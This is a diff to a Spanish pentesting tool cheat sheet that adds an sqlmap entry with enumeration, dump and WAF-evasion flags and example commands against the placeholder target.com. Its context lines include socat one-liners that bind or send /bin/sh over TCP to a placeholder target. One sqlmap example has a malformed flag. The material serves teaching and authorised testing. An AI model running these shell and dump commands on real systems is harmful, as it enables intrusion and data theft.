@@ -322,6 +322,18 @@ Herramienta multipropósito que permite crear, redirigir y manipular conexiones 
 - Funciona como alternativa más avanzada que netcat para depurar servicios, redirigir tráfico y realizar pruebas de red complejas.
 - Ejemplos: `socat TCP:IP_target:PORT EXEC:/bin/sh` · `socat TCP-LISTEN:PORT,fork EXEC:/bin/sh` · `socat TCP-LISTEN:LOCAL_PORT,fork TCP:IP_target:REMOTE_PORT` · `socat OPENSSL:IP_target:PORT STDOUT`
 
+### `sqlmap`  
+Herramienta automatizada para **detección y explotación de vulnerabilidades de SQL Injection**.  
+- Qué hace: identifica y explota inyecciones SQL en parámetros **GET, POST, cookies y headers**, permitiendo extraer bases de datos, tablas, usuarios y, en ciertos casos, ejecutar comandos en el sistema.  
+- Soporta múltiples motores de bases de datos: **MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite**, entre otros.  
+- Técnicas soportadas: **boolean-based blind, error-based, time-based blind, UNION-based, stacked queries**.  
+- Permite enumeración completa: bases de datos (`--dbs`), tablas (`--tables`), columnas (`--columns`), volcado de datos (`--dump`).  
+- Puede evadir defensas básicas usando **tamper scripts**, cambio de user-agent y control de riesgo/nivel (`--tamper`, `--random-agent`, `--risk`, `--level`).  
+- Uso típico en pentesting web: validar si un input es vulnerable, automatizar explotación de SQLi y demostrar impacto de forma controlada.  
+- Riesgos y ética: herramienta **muy intrusiva y ruidosa**; usar **solo** en laboratorios o entornos explícitamente autorizados.  
+- Ejemplos: `sqlmap -u "http://target.com/page.php?id=1" --dbs`, `sqlmap -u "http://target.com/login.php" --forms --batch -db`, `sqlmap -u "http://target.com/item.php?id=5" --tables -D database_name`, `sqlmap -r request.txt --dump`
+
+
 ### `steghide`
 Herramienta para **ocultar y extraer datos** dentro de archivos (steganografía).
 - Soporta formatos: JPEG, BMP, WAV, AU.
